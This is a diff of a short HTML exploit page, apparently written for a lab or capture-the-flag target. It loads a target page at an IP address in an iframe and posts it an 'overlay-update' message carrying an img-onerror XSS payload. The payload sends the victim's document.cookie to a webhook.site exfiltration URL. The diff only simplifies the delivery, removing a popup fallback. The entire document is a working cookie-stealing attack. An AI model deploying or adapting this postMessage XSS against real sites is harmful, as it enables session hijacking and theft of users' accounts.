@@ -2,41 +2,18 @@
 <html>
 <head><meta charset="UTF-8"><title>x</title></head>
 <body>
+<iframe id="f" src="http://34.87.93.26:3000/video.html?v=featured"
+        style="width:800px;height:600px"></iframe>
 <script>
 const EXFIL = "https://webhook.site/c8b5eb75-9989-4b28-8dfa-6b11ee60562f";
-const TARGET = "http://34.87.93.26:3000/video.html?v=featured";
 
-function sendPayload(win, origin) {
+document.getElementById('f').onload = function() {
   const payload = `<img src=">" onerror=fetch('${EXFIL}?c='+encodeURIComponent(document.cookie))>`;
-  win.postMessage(
-    JSON.stringify({ type: "overlay-update", content: payload }),
-    origin
+  document.getElementById('f').contentWindow.postMessage(
+    JSON.stringify({type:"overlay-update", content: payload}),
+    "http://34.87.93.26:3000"
   );
-}
-
-// Method 1: iframe
-const frame = document.createElement("iframe");
-frame.src = TARGET;
-frame.style.cssText = "width:800px;height:600px;border:0";
-document.body.appendChild(frame);
-
-frame.onload = function() {
-  setTimeout(function() {
-    sendPayload(frame.contentWindow, "http://34.87.93.26:3000");
-  }, 2000);
 };
-
-// Method 2: popup (fallback)
-setTimeout(function() {
-  try {
-    const win = window.open(TARGET, "_blank");
-    if (win) {
-      setTimeout(function() {
-        sendPayload(win, "http://34.87.93.26:3000");
-      }, 4000);
-    }
-  } catch(e) {}
-}, 1000);
 </script>
 </body>
 </html>
